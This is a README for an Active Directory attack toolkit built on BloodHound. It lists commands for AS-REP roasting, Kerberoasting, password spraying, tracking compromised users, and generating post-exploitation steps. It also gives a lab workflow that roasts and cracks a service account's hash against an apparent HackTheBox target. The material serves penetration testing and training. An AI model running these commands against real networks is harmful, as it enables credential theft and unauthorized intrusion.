# BloodTrail

Active Directory attack path discovery and exploitation toolkit. Extends BloodHound with pre-auth enumeration, credential pipelines, and automated command generation.

## Features

| Feature | Description |
|---------|-------------|
| Pre-Auth Enumeration | AS-REP roasting, Kerberoasting, password policy discovery |
| Credential Pipeline | Validate → Collect → Import → Mark Pwned → Query |
| Edge Enhancement | Import missing edges from SharpHound exports |
| Query Library | 63+ Cypher queries for attack path discovery |
| Pwned Tracking | Track compromised users and access paths in Neo4j |
| Command Generation | Auto-suggest exploitation commands for discovered paths |
| Password Spraying | Policy-aware spraying with lockout protection |

## Quick Start

```bash
# Anonymous enumeration
crack bloodtrail 10.10.10.161

# With credentials (auto-validates, collects BloodHound, marks pwned)
crack bloodtrail 10.10.10.161 --creds svc-alfresco:s3rvice

# Import existing SharpHound data
crack bloodtrail /path/to/sharphound.zip

# Resume with existing Neo4j data
crack bloodtrail -r

# Mark user pwned and view attack paths
crack bloodtrail --pwn 'USER@DOMAIN.COM' --cred-type password --cred-value 'secret'
```

## Command Reference

### Enumeration (Pre-Auth)

```bash
crack bloodtrail <IP>                        # Anonymous enumeration
crack bloodtrail <IP> -u user -p pass        # Authenticated
crack bloodtrail <IP> --domain corp.local    # Specify domain
crack bloodtrail --list-enumerators          # Show available tools
```

Discovers: AS-REP roastable users, Kerberoastable SPNs, password policy, domain users/groups.

### Credential Pipeline

```bash
crack bloodtrail <IP> --creds user:pass              # Inline
crack bloodtrail <IP> --creds 'DOMAIN/user:pass'     # With domain
crack bloodtrail <IP> --creds-file ./creds.txt       # From file
crack bloodtrail <IP> --use-potfile                  # From hashcat potfile
crack bloodtrail <IP> --creds 'user:<NTLM_HASH>'     # NTLM hash (auto-detected)
```

Pipeline: `Parse → Validate → Collect → Import → Mark Pwned → Query`

| Flag | Effect |
|------|--------|
| `--skip-validate` | Skip credential validation |
| `--no-collect` | Skip BloodHound collection |
| `--no-pwn` | Skip marking users as pwned |

### BloodHound Import

```bash
crack bloodtrail /path/to/sharphound.zip     # Import ZIP
crack bloodtrail /path/to/bh_data/           # Import directory
crack bloodtrail /path --preset attack-paths # High-value edges only
crack bloodtrail /path --validate            # Validate without import
crack bloodtrail --list-edges                # Show supported edge types
```

### Query Library

```bash
crack bloodtrail --list-queries              # List all 63+ queries
crack bloodtrail --search-query kerberos     # Search by keyword
crack bloodtrail --run-query find-asrep      # Execute single query
crack bloodtrail --run-all                   # Run all, generate report
crack bloodtrail --install-queries           # Install to BloodHound GUI
```

### Pwned User Tracking

```bash
crack bloodtrail --pwn 'USER@DOMAIN.COM' --cred-type password --cred-value 'secret'
crack bloodtrail --pwn-interactive           # Interactive mode
crack bloodtrail --list-pwned                # List all pwned users
crack bloodtrail --pwned-user USER           # User details + commands
crack bloodtrail --unpwn USER                # Remove pwned status
crack bloodtrail --cred-targets              # Credential harvest targets
crack bloodtrail --post-exploit              # Post-exploitation commands
crack bloodtrail --recommend                 # Attack path recommendations
```

### Domain Configuration

```bash
crack bloodtrail --show-config               # Show stored config
crack bloodtrail --dc-ip 10.10.10.1          # Set DC IP
crack bloodtrail --domain-sid S-1-5-21-...   # Set domain SID
crack bloodtrail --lhost 10.10.14.5 --lport 443  # Callback config
crack bloodtrail --discover-dc user pass     # Auto-discover DC
crack bloodtrail --clear-config              # Clear config
crack bloodtrail --purge                     # Purge all Neo4j data
```

### Password Policy & Spraying

```bash
# Policy
crack bloodtrail --set-policy                # Import from 'net accounts'
crack bloodtrail --set-policy policy.txt     # From file
crack bloodtrail --show-policy               # Display policy
crack bloodtrail --clear-policy              # Clear policy

# Spraying
crack bloodtrail --spray                     # Spray recommendations
crack bloodtrail --spray-tailored            # BloodHound-based targeting
crack bloodtrail --auto-spray                # Generate spray scripts
crack bloodtrail --auto-spray --execute      # Execute with confirmation
```

## Neo4j Connection

Default: `bolt://localhost:7687`

```bash
# CLI override
crack bloodtrail --uri bolt://host:7687 --user neo4j --password secret
```

Config file (`~/.crack/config.json`):
```json
{
  "bloodtrail": {
    "neo4j_uri": "bolt://localhost:7687",
    "neo4j_user": "neo4j",
    "neo4j_password": "your_password"
  }
}
```

## Example Workflow

```bash
# 1. Anonymous enumeration - find AS-REP roastable users
crack bloodtrail 10.10.10.161

# 2. AS-REP roast discovered user
impacket-GetNPUsers -dc-ip 10.10.10.161 -request -no-pass htb/svc-alfresco

# 3. Crack the hash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

# 4. Feed credentials back (validates, collects BloodHound, marks pwned)
crack bloodtrail 10.10.10.161 --creds svc-alfresco:s3rvice

# 5. View attack paths from pwned user
crack bloodtrail --pwned-user 'SVC-ALFRESCO@HTB.LOCAL'

# 6. Get exploitation commands
crack bloodtrail --post-exploit
```

## Output Files

Generated in working directory or next to imported data:

| File | Contents |
|------|----------|
| `bloodtrail.md` | Full attack path report |
| `users_all.txt` | All discovered users |
| `users_real.txt` | Non-service accounts (spray targets) |
| `asrep_targets.txt` | AS-REP roastable users |
| `kerberoast_targets.txt` | Users with SPNs |
| `computers.txt` | Computer names |
| `domain_info.txt` | Domain summary |

## Architecture

```
bloodtrail/
├── cli/                      # Command-line interface
│   ├── base.py              # BaseCommandGroup ABC
│   ├── parser.py            # Argument parser
│   ├── interactive.py       # Interactive helpers
│   └── commands/            # Command handlers
│       ├── query.py         # --list-queries, --run-query, --run-all
│       ├── pwned.py         # --pwn, --list-pwned, --post-exploit
│       ├── config.py        # --dc-ip, --show-config, --purge
│       ├── policy.py        # --set-policy, --show-policy
│       ├── spray.py         # --spray, --auto-spray
│       ├── creds.py         # --creds, --use-potfile
│       ├── enumerate.py     # IP address mode
│       └── import_data.py   # Path/ZIP import mode
│
├── core/                     # Shared utilities
│   ├── models.py            # Query, QueryResult dataclasses
│   ├── formatters.py        # Display formatting
│   ├── neo4j_connection.py  # Connection management
│   └── query_loader.py      # JSON query loading
│
├── enumerators/              # Pre-auth enumeration plugins
│   ├── enum4linux.py        # SMB/RPC enumeration
│   ├── ldapsearch.py        # LDAP enumeration
│   ├── kerbrute.py          # Kerberos user enum
│   └── getnpusers.py        # AS-REP roasting
│
├── autospray/                # Password spray automation
│   ├── executor.py          # Spray execution
│   ├── lockout.py           # Lockout protection
│   └── sources.py           # Credential sources
│
├── display/                  # Output formatting
│   ├── tables.py            # Table rendering
│   ├── attack_paths.py      # Attack path display
│   └── post_exploit.py      # Post-exploitation commands
│
├── cypher_queries/           # Query library (JSON)
│   ├── quick_wins.json
│   ├── lateral_movement.json
│   ├── privilege_escalation.json
│   └── attack_chains.json
│
├── main.py                   # BHEnhancer core
├── query_runner.py           # Cypher execution
├── report_generator.py       # Report generation
├── pwned_tracker.py          # Pwned user tracking
├── command_suggester.py      # Command generation
└── creds_pipeline.py         # Credential pipeline
```

## Testing

```bash
python -m pytest tests/tools/post/bloodtrail/ -v
```

797 tests covering credential parsing, spray execution, query handling, and Neo4j integration.
